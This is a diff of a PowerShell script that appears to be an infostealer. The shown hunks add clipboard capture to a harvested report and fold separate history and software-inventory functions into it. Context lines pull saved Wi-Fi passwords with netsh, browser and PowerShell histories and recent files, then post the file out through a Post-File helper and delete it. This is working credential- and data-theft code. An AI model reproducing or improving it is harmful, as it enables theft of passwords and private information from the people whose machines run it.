@@ -301,7 +301,7 @@ foreach ($folder in $foldersToSearch) {
                     }
                 }
                 $entryName = $file.FullName.Substring($folder.Length + 1)
-                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
+                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName) | Out-Null
                 $currentZipSize += $fileSize
             }
         }
@@ -419,7 +419,6 @@ if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -No
 $pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim();$outssid+="SSID: $ssid : Password: $pass`n"}}}$a++;}
 $RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime
 $contents = "========================================================
-
 Current User    : $env:USERNAME
 Email Address   : $email
 Language        : $systemLanguage
@@ -446,6 +445,8 @@ $systemString"
 "Drivers `n -----------------------------------------------------------------------`n$drivers" | Out-File -FilePath $FilePath -Encoding ASCII -Append
 "`n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
 "HISTORY INFO `n ====================================================================== `n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"Clipboard          `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+(Get-Clipboard | Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
 "Browser History    `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
 ($Value| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
 ($Value2| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
@@ -455,45 +456,6 @@ $systemString"
 ($RecentFiles | Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
 Post-Message
 Post-File ;rm -Path $FilePath -Force
-}
-
-Function Software-Info{
-$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine
-$service=Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}
-$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize
-$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
-$FilePath = "$env:temp\SoftwareInfo.txt"
-"SOFTWARE INFO `n ======================================================================" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"Installed Software `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-($software| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"Processes          `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-($process| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"Services           `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-($service| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
-Post-File ;rm -Path $FilePath -Force
-}
-
-Function History-Info{
-$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime
-$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
-$Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
-$Value | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
-$Regex2 = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Pathed = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
-$Value2 = Get-Content -Path $Pathed | Select-String -AllMatches $regex2 |% {($_.Matches).Value} |Sort -Unique
-$Value2 | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
-$pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";$pshistory = Get-Content $pshist -raw
-$FilePath = "$env:temp\History.txt"
-"HISTORY INFO `n ====================================================================== `n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"Clipboard          `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-(Get-Clipboard | Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"Browser History    `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-($Value| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
-($Value2| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"Powershell History `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-($pshistory| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
-Post-File ;rm -Path $FilePath -Force
-"Recent Files `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($RecentFiles | Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 }
 
 Function Enumerate-LAN{
